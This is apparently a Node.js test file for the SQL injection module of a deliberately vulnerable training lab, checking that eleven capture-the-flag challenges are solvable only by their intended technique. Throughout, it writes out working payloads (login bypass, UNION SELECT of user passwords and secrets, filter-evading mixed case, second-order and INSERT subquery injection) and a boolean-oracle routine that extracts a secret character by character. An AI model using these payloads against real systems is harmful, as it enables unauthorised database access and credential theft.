'use strict';
// SQL Injection module: every challenge must be solvable by the documented
// technique and must NOT be solvable by the obvious shortcut. Tests share one
// booted server, so each test uses a fresh client (own cookie jar/session)
// and distinct usernames where the exploit writes rows.
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const MOD = 'sqli';

// The admin user's random per-deployment secret: the exfiltration target for
// several labs in this module. Read directly from the throwaway test DB only
// to assert that an oracle-driven extraction landed on the right value.
function adminSecretFromDb(dataDir) {
  const Database = require('better-sqlite3');
  const db = new Database(path.join(dataDir, 'vulnlab.db'), { readonly: true });
  const row = db.prepare("SELECT secret FROM users WHERE username = 'admin'").get();
  db.close();
  return row.secret;
}

function assertNoFlag(text, label) {
  assert.equal((text.match(FLAG_RE) || []).length, 0, `flag leaked on ${label}`);
}

// Every control on the page must carry a clay-* class (hidden inputs and the
// copy buttons of payload blocks are the only exceptions).
function assertStyled(html, label) {
  assert.ok(!html.includes('\u2014'), `em dash on ${label}`);
  assert.ok(!/\sstyle=/.test(html), `inline style on ${label}`);
  assert.ok(!/<style[\s>]/.test(html), `style block on ${label}`);
  assert.ok(!/<table(?![^>]*class=)/.test(html), `bare table on ${label}`);
  for (const m of html.matchAll(/<input\b[^>]*>/g)) {
    assert.ok(/type="hidden"/.test(m[0]) || /class="[^"]*clay-input/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  }
  for (const m of html.matchAll(/<select\b[^>]*>/g)) assert.ok(/class="[^"]*clay-select/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  for (const m of html.matchAll(/<textarea\b[^>]*>/g)) assert.ok(/class="[^"]*clay-input/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  for (const m of html.matchAll(/<button\b[^>]*>/g)) {
    assert.ok(/class="[^"]*(clay-btn|copy-btn)/.test(m[0]), `unstyled ${m[0]} on ${label}`);
  }
}

// Internal hrefs and form actions found on a page.
function internalTargets(html) {
  const links = new Set();
  for (const m of html.matchAll(/\bhref="(\/[^"]*)"/g)) {
    const href = m[1].replace(/&amp;/g, '&').split('#')[0];
    if (href && !href.startsWith('//')) links.add(href);
  }
  const forms = [];
  for (const m of html.matchAll(/<form\b[^>]*>/g)) {
    const action = (m[0].match(/action="([^"]*)"/) || [])[1];
    const method = ((m[0].match(/method="([^"]*)"/) || [])[1] || 'GET').toUpperCase();
    if (action) forms.push({ action, method });
  }
  return { links: [...links], forms };
}

async function assertTargetsResolve(base, html, label) {
  const probe = client(base);
  const { links, forms } = internalTargets(html);
  for (const href of links) {
    const r = await probe.get(href);
    assert.notEqual(r.status, 404, `${label}: dead link ${href}`);
  }
  for (const f of forms) {
    const r = f.method === 'POST' ? await probe.post(f.action, {}) : await probe.get(f.action);
    assert.notEqual(r.status, 404, `${label}: dead form action ${f.method} ${f.action}`);
  }
}

const HEX = '0123456789abcdef';

// Binary-searches one character of the admin secret through a boolean oracle.
// `probeAt(pos, ch)` must resolve true when secret[pos] <= ch.
async function binaryChar(probeAt, pos) {
  let lo = 0, hi = HEX.length - 1;
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    const isTrue = await probeAt(pos, HEX[mid]);
    if (isTrue) hi = mid; else lo = mid + 1;
  }
  return HEX[lo];
}

// Extracts the 32 hex characters of PENTRIX{<hex>} via a boolean oracle.
// Positions 1-8 are the fixed literal "PENTRIX{", so only 9..40 vary.
async function extractSecretHex(probeAt) {
  let hex = '';
  for (let i = 0; i < 32; i++) hex += await binaryChar(probeAt, 9 + i);
  return `PENTRIX{${hex}}`;
}

test('sqli module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, MOD, id);
  const sqliCaptured = async (c) => (await capturedSet(c)).filter((s) => s.startsWith('sqli:'));

  await t.test('module index renders, 11 challenges, every challenge reachable, no em dash, no flag', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/sqli');
    assert.equal(status, 200);
    assertStyled(text, '/sqli');
    assertNoFlag(text, '/sqli');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 11);
    for (const id of ['login-bypass', 'union', 'blind', 'error', 'order-by', 'second-order', 'like-wildcard', 'limit-offset', 'groupby-having', 'union-filter-bypass', 'insert-inject']) {
      assert.ok(text.includes(`id="${id}"`), `card ${id}`);
    }
    assert.equal((text.match(/Hint \d: (Nudge|Technique|Explicit)/g) || []).length, 33, 'every challenge needs a 3-step hint ladder');
    await assertTargetsResolve(srv.base, text, '/sqli');
  });

  await t.test('login-bypass: wrong password and the real admin password earn nothing, the classic bypass earns the flag', async () => {
    const c = client(srv.base);
    const formPage = await c.get('/sqli/login');
    assert.equal(formPage.status, 200);
    assertStyled(formPage.text, '/sqli/login form');

    const wrong = await c.post('/sqli/login', { username: 'alice', password: 'nope' });
    assertNoFlag(wrong.text, '/sqli/login wrong creds');
    assert.deepEqual(await sqliCaptured(c), []);

    // Fake shortcut: the real seeded admin credentials, no injection involved.
    const realCreds = await c.post('/sqli/login', { username: 'admin', password: 'admin123' });
    assertNoFlag(realCreds.text, '/sqli/login real admin creds');
    assert.deepEqual(await sqliCaptured(c), []);

    const bypass = await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal(bypass.status, 200);
    assert.ok(bypass.text.includes(flagOf('login-bypass')));
    assertStyled(bypass.text, '/sqli/login bypass result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Login Bypass'));

    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal((await sqliCaptured(c)).filter((s) => s === 'sqli:Login Bypass').length, 1, 'repeat must not double count');
  });

  await t.test('union: a benign search earns nothing, UNION SELECT against users earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/products?q=hoodie');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/products benign');
    assertNoFlag(benign.text, '/sqli/products benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('union')));
    assertStyled(hit.text, '/sqli/products union result');
    assert.ok((await sqliCaptured(c)).includes('sqli:UNION-based Injection'));
  });

  await t.test('blind: a wrong guess earns nothing, the oracle-extracted secret earns the flag', async () => {
    const c = client(srv.base);
    const formPage = await c.get('/sqli/product?id=1');
    assert.equal(formPage.status, 200);
    assertStyled(formPage.text, '/sqli/product form');

    const wrong = await c.post('/sqli/blind-submit', { secret: 'not-the-secret' });
    assertNoFlag(wrong.text, '/sqli/blind-submit wrong guess');
    assert.deepEqual(await sqliCaptured(c), []);

    const probeAt = async (pos, ch) => {
      const id = `0' OR (SELECT substr(secret,${pos},1) FROM users WHERE username='admin') <= '${ch}' -- `;
      const r = await c.get(`/sqli/product?id=${encodeURIComponent(id)}`);
      return r.text.includes('Product exists.');
    };
    const extracted = await extractSecretHex(probeAt);
    assert.equal(extracted, adminSecretFromDb(dataDir), 'boolean-oracle extraction must match the real admin secret');

    const hit = await c.post('/sqli/blind-submit', { secret: extracted });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('blind')));
    assertStyled(hit.text, '/sqli/blind-submit result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Boolean Blind Injection'));
  });

  await t.test('error: a plain numeric id earns nothing, a stray quote triggers the error oracle and earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/detail?id=1');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/detail benign');
    assertNoFlag(benign.text, '/sqli/detail benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/detail?id=${encodeURIComponent("1'")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('error')));
    assertStyled(hit.text, '/sqli/detail error result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Error-based Injection'));
  });

  await t.test('order-by: a plain sort column earns nothing, a CASE WHEN oracle against users earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get(`/sqli/sort?sort=${encodeURIComponent('price DESC')}`);
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/sort benign');
    assertNoFlag(benign.text, '/sqli/sort benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const payload = "CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END -- ";
    const hit = await c.get(`/sqli/sort?sort=${encodeURIComponent(payload)}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('order-by')));
    assertStyled(hit.text, '/sqli/sort oracle result');
    assert.ok((await sqliCaptured(c)).includes('sqli:ORDER BY Injection'));
  });

  await t.test('second-order: a normal display name earns nothing, a stored quote-breakout lands on admin and earns the flag', async () => {
    const c = client(srv.base);
    const regPage = await c.get('/sqli/register');
    assert.equal(regPage.status, 200);
    assertStyled(regPage.text, '/sqli/register form');

    await c.post('/sqli/register', { username: 'demo-normal', display_name: 'Demo Normal', password: 'demo12345' });
    const normalProfile = await c.get('/sqli/profile?u=demo-normal');
    assertNoFlag(normalProfile.text, '/sqli/profile normal');
    assertStyled(normalProfile.text, '/sqli/profile normal');
    assert.deepEqual(await sqliCaptured(c), []);

    await c.post('/sqli/register', { username: 'evil-second-order', display_name: "admin'-- ", password: 'evil12345' });
    const hit = await c.get('/sqli/profile?u=evil-second-order');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('second-order')));
    assertStyled(hit.text, '/sqli/profile stored-injection result');
    assert.ok((await sqliCaptured(c)).includes('sqli:Second-Order SQL Injection'));
  });

  await t.test('like-wildcard: a wrong guess earns nothing, the LIKE oracle-extracted secret earns the flag', async () => {
    const c = client(srv.base);
    const baseline = await c.get('/sqli/wildcard?q=');
    assert.equal(baseline.status, 200);
    assertStyled(baseline.text, '/sqli/wildcard baseline');
    const total = Number((baseline.text.match(/<b>(\d+)<\/b> of (\d+) products match/) || [])[2]);
    assert.ok(total > 0, 'catalog must have products to match against');

    const wrong = await c.post('/sqli/wildcard/submit', { secret: 'nope' });
    assertNoFlag(wrong.text, '/sqli/wildcard/submit wrong guess');
    assert.deepEqual(await sqliCaptured(c), []);

    const probeAt = async (pos, ch) => {
      const q = `' AND (SELECT substr(secret,${pos},1) FROM users WHERE username='admin') <= '${ch}' -- `;
      const r = await c.get(`/sqli/wildcard?q=${encodeURIComponent(q)}`);
      const m = r.text.match(/<b>(\d+)<\/b> of (\d+) products match/);
      return !!m && Number(m[1]) === total;
    };
    const extracted = await extractSecretHex(probeAt);
    assert.equal(extracted, adminSecretFromDb(dataDir), 'LIKE-oracle extraction must match the real admin secret');

    const hit = await c.post('/sqli/wildcard/submit', { secret: extracted });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('like-wildcard')));
    assertStyled(hit.text, '/sqli/wildcard/submit result');
    assert.ok((await sqliCaptured(c)).includes('sqli:LIKE Wildcard Exfiltration'));
  });

  await t.test('limit-offset: a plain numeric limit earns nothing, LIMIT syntax injection earns the flag', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/paged?limit=2');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/paged benign');
    assertNoFlag(benign.text, '/sqli/paged benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get('/sqli/paged?limit=-1');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('limit-offset')));
    assertStyled(hit.text, '/sqli/paged limit-syntax result');
    assert.ok((await sqliCaptured(c)).includes('sqli:LIMIT/OFFSET Injection'));
  });

  await t.test('groupby-having: a plain grouping column earns nothing, grouping by a subquery leaks the admin secret', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/stats?by=region');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/stats benign');
    assertNoFlag(benign.text, '/sqli/stats benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT secret FROM users WHERE username='admin')")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('groupby-having')));
    assertStyled(hit.text, '/sqli/stats group-by result');
    assert.ok((await sqliCaptured(c)).includes('sqli:GROUP BY Injection'));
  });

  await t.test('union-filter-bypass: a benign search and the blocked lowercase keyword earn nothing, mixed case bypasses the filter', async () => {
    const c = client(srv.base);
    const benign = await c.get('/sqli/shop?q=hoodie');
    assert.equal(benign.status, 200);
    assertStyled(benign.text, '/sqli/shop benign');
    assertNoFlag(benign.text, '/sqli/shop benign');
    assert.deepEqual(await sqliCaptured(c), []);

    const blocked = await c.get(`/sqli/shop?q=${encodeURIComponent("' union SELECT id,username,password,secret FROM users-- ")}`);
    assertNoFlag(blocked.text, '/sqli/shop blocked lowercase keyword');
    assert.deepEqual(await sqliCaptured(c), []);

    const hit = await c.get(`/sqli/shop?q=${encodeURIComponent("' UnIoN SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('union-filter-bypass')));
    assertStyled(hit.text, '/sqli/shop bypass result');
    assert.ok((await sqliCaptured(c)).includes('sqli:UNION Filter Bypass'));
  });

  await t.test('insert-inject: normal feedback earns nothing, a VALUES subquery writes the secret and earns the flag', async () => {
    const c = client(srv.base);
    await c.post('/sqli/feedback', { name: 'Regular User', message: 'Great shop, fast delivery.' });
    const afterBenign = await c.get('/sqli/feedback');
    assert.equal(afterBenign.status, 200);
    assertStyled(afterBenign.text, '/sqli/feedback benign');
    assertNoFlag(afterBenign.text, '/sqli/feedback benign');
    assert.deepEqual(await sqliCaptured(c), []);

    await c.post('/sqli/feedback', { name: "x', (SELECT secret FROM users WHERE username='admin')) -- ", message: 'hello' });
    const hit = await c.get('/sqli/feedback');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('insert-inject')));
    assertStyled(hit.text, '/sqli/feedback subquery result');
    assert.ok((await sqliCaptured(c)).includes('sqli:INSERT Injection'));
  });

  await t.test('scoreboard counts every sqli challenge exactly once, even after repeating the exploits', async () => {
    const c = client(srv.base);
    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'x' });
    await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    await c.get(`/sqli/detail?id=${encodeURIComponent("1'")}`);
    await c.get('/sqli/paged?limit=-1');
    await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT secret FROM users WHERE username='admin')")}`);
    await c.get(`/sqli/shop?q=${encodeURIComponent("' UnIoN SELECT id,username,password,secret FROM users-- ")}`);
    const got = (await sqliCaptured(c)).length;
    assert.equal(got, 6);

    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'x' });
    await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
    assert.equal((await sqliCaptured(c)).length, 6, 'repeating the exploits must not double count');
  });
});
